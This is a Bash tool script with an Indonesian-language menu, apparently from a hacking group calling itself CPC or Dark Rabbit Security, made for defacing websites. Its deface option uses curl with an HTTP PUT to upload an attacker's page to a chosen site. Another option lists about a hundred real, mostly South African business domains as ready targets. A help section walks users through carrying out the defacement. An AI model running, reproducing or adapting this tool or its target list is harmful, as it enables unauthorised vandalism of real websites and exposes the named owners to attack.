blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
echo
echo
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                  CIREBON PROGRAMMER COMUNITY"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"                         CPC-TOOLS"
echo $green"                       Author : suhandi"
echo $cyan"                contact : rabbtdark28@gmail.com"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"           thanks to : Mr.Ghost Includex & Frezz"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $green" [A].Deface"
echo $green" [B].web vuln"
echo $green" [C].penjelasan & cara pakai"
echo $red" [D].exit"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"MASUKAN PILIHAN ANDA"
echo $red" "
read -p " DRS@root# "  apaan

if [ $apaan = "A" ] || [ $apaan = "a" ]
then
clear
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                   DARK RABBIT SECURITY"
echo $green"                    Author : suhandi"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
toilet -f standard  Deface Web
echo
echo $cyan" Masukan Web Target"
echo $red" "
read -p " DRS@root# "  target
echo
echo $cyan" Masukan Script Kamu"
echo $red" "
read -p " DRS@root# " script
curl -T /storage/emulated/0/$script $target
echo $green"Hasil deface =>$target/$script"
echo
echo $blue"Terimakasih Telah Menggunakan Jasa Kami"
echo 
echo $purple"Tekan Enter Untuk Kembali"
read -p " " back
sh deface.sh
fi

if [ $apaan = "B" ] || [ $apaan = "b" ]
then
clear
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                   DARK RABBIT SECURITY"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $purple"                    KUMPULAN WEB VULN"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo
echo $blue "SILAKAN PILIH SALAH SATU WEB VULN YANG KAMI SEDIAKAN:)"
echo
echo $cyan"http://bitsandpieces.co.za"
echo $cyan"http://cblandscapes.co.za"
echo $cyan"http://windmillsandporcupines.co.za"
echo $cyan"http://scnc.co.za"
echo $cyan"http://contsol.co.za"
echo $cyan"http://consultec.co.za"
echo $cyan"http://colourfactory.co.za"
echo $cyan"http://ayk.co.za"
echo $cyan"http://daretogowildafrica.co.za"
echo $cyan"http://floralandfresh.co.za"
echo $cyan"http://foodconsult.co.za"
echo $cyan"http://itsengineering.co.za"
echo $cyan"http://hybriddevelopments.co.za"
echo $cyan"http://holotropicbreathwork.co.za"
echo $cyan"http://hanover-cs.co.za"
echo $cyan"http://handj.co.za"
echo $cyan"http://lwrm.co.za"
echo $cyan"http://lubbestrust.co.za"
echo $cyan"http://lpenterprises.co.za"
echo $cyan"http://kwalitycommodities.co.za"
echo $cyan"http://mestern.co.za"
echo $cyan"http://megro.co.za"
echo $cyan"http://bitpc.co.za"
echo $cyan"http://butterflowers.co.za"
echo $cyan"http://beeit.co.za"
echo $cyan"http://esfml.com"
echo $cyan"http://bee-it.co.za"
echo $cyan"http://mc3qs.com"
echo $cyan"http://marjoriebresler.com"
echo $cyan"http://naturaleyeimages.com"
echo $cyan"http://my-resume.biz"
echo $cyan"http://mpark.co.za"
echo $cyan"http://montdestin.com"
echo $cyan"http://africa-one.co.za"
echo $cyan"http://ads247.co.za"
echo $cyan"http://accelerate-kids.co.za"
echo $cyan"http://8x8.co.za"
echo $cyan"http://aaglcapetown2013.org.za"
echo $cyan"http://allpaint.co.za"
echo $cyan"http://andrewswebcorner.co.za"
echo $cyan"http://applebyguesthouse.com"
echo $cyan"http://atlanticphysio.co.za"
echo $cyan"http://page31.co.za"
echo $cyan"http://vaigaidigitals.com"
echo $cyan"http://systemshouse.co.za"
echo $cyan"http://www.studentsonline.co.za"
echo $cyan"http://lucaniphysio.co.za"
echo $cyan"http://www.onboardpublications.co.za"
echo $cyan"http://www.oilandclay.co.za"
echo $cyan"http://www.aquafitness.za.net"
echo $cyan"http://www.helderbergit.co.za"
echo $cyan"http://www.pipelinetape.co.za"
echo $cyan"http://www.drcrsaexpress.co.za"
echo $cyan"http://officeelf.co.za"
echo $cyan"http://troop-1539.org"
echo $cyan"http://happy.mikikk.co.jp"
echo $cyan"http://www.alfunctiondesigns.co.za"
echo $cyan"http://mix007.co.za"
echo $cyan"http://spyroom.co.za"
echo $cyan"http://sportspod.co.za"
echo $cyan"http://southernafricablog.com"
echo $cyan"http://stand66.com"
echo $cyan"http://tapifare.com"
echo $cyan"http://tankertech.co.za"
echo $cyan"http://tcnig.co.za"
echo $cyan"http://tcmgroup.co.za"
echo $cyan"http://tressor.co.za"
echo $cyan"http://trafficam.co.za"
echo $cyan"http://tuthukani.co.za"
echo $cyan"http://nyarhi.co.za"
echo $cyan"http://digishop.co.za"
echo $cyan"http://elinemsa.co.za"
echo $cyan"http://disucctv.co.za"
echo $cyan"http://www.cai.co.za"
echo $cyan"http://tirupurjobs.net"
echo $cyan"http://inlislitev3.perpusnas.go.id"
echo $cyan"http://clcooling.co.za"
echo $cyan"http://sublimeconfectionery.co.za"
echo $cyan"http://gogreenplumbing.co.za"
echo $cyan"http://golfbuzz.co.za"
echo $cyan"http://grupo-cma.com"
echo $cyan"http://inkspot.co.za"
echo $cyan"http://kgarebana.co.za"
echo $cyan"http://ittrader.co.za"
echo $cyan"http://hellomobile.mobi"
echo $cyan"http://homebuzz.co.za"
echo $cyan"http://gordonhoward.co.za"
echo $cyan"http://democonstruction.co.za"
echo $cyan"http://chasingfantasia.co.za"
echo $cyan"http://litehouse.co.za"
echo $cyan"http://ldata.co.za"
echo $cyan"http://lunique.co.za"
echo $cyan"http://chillibitez.co.za"
echo $cyan"http://cmweb.co.za"
echo $cyan"http://essentialtours.com"
echo $cyan"http://entitledvip.com"
echo $cyan"http://frankadesign.com"
echo $cyan"http://forget-me-not.co.za"
echo $cyan"http://findpersonnel.co.za"
echo $cyan"http://everythingdating.co.za"
echo $purple"Sudah Memilih?"
read -p " Sudah? (Y)" ya
clear
echo $purple"Tekan Enter Untuk Kembali"
read -p " " back
sh deface.sh
fi


if [ $apaan = "C" ] || [ $apaan = "c" ]
then
clear
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"                 CIREBON PROGRAMMER INDONESIA"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $blue"         PENJELASAN DAN TATA CARA PEMAKAIAN TOOLS"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $white"hello gays kami akan menjelaskan beberapa mengenai tools kami yang pertama tools kami yaitu tools deface dengam disertai web vuln jadi agan gausah ribet² bikin dork lalu dorking ke google agan tinggal pilih saja di menu (B)"
echo $white"nah cara pakainya sangatlah mudah gan.. agan tinggal pilih dari menu yang kami siapkan misal agan mau deface langsung silakan agan ketik A/a lalu klik enter lalu disana agan masukin web target agan eiits kembali lagi kalau agan blm ada web target silakan agan ketik B/b pada menu awal"
echo $white"Kalau agan udah punya web target yang vuln langsung eksekusi gan.. di menu A agan akan disuruh memasukan web target tinggal agan masukin ajah web targetnya"
echo $white"nah kalau udah agan masukim script deface nya eiits kembali lagi script deface nya agan taruh diluar folder di penyimpanan internal ya gan"
echo $white"kalau udah agan masukim SC nya klik enter gan.. tunggu prosesnya...kalau udah agan copy url hasil deface agan...."
echo $white"udah paham kan gan cara² pakai dan penjelasam tools kami? kalau udah mungkin cukup sekian ajah gan h3h3h terimakasih telah menggunakan jasa tools kami:)"
echo $purple"Sudah Paham?"
read -p " Sudah Paham? (Y) " ya
clear
echo $purple"Tekan Enter Untuk Kembali"
read -p " " back
sh deface.sh
fi


if [ $apaan = "D" ] || [ $apaan = "d" ]
then
clear
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
echo $red"Anda Yakin Ingin Keluar?"
echo $yellow"××××××××××××××××××××××××××××××××××××××××××××××××××××××××"
read -p "Ya? (Y)" ya
clear
echo $green"Terimakasih telah menggunakam dan mempercayai jasa tools kami mohon maaf bila ada ketidaknyamanan anda di tools kami.. kami akan segera memperbaiki kesalahan di tools kami..."
echo $green"Salam Damai Dari Kami" $red"CIREBON PROGRAMMER COMUNITY" $green"Semoga anda selalu diberikan kesehatan oleh tuhan YME"
echo $blue" We Are CPC team"
echo $blue"We Hacked Silently"
echo $blue"We Move With One Command"
echo $blue" Expect US ! "
echo
echo
echo
echo $purple"Tekan Enter Untuk Keluar"
read -p " " enter
clear
exit
fi
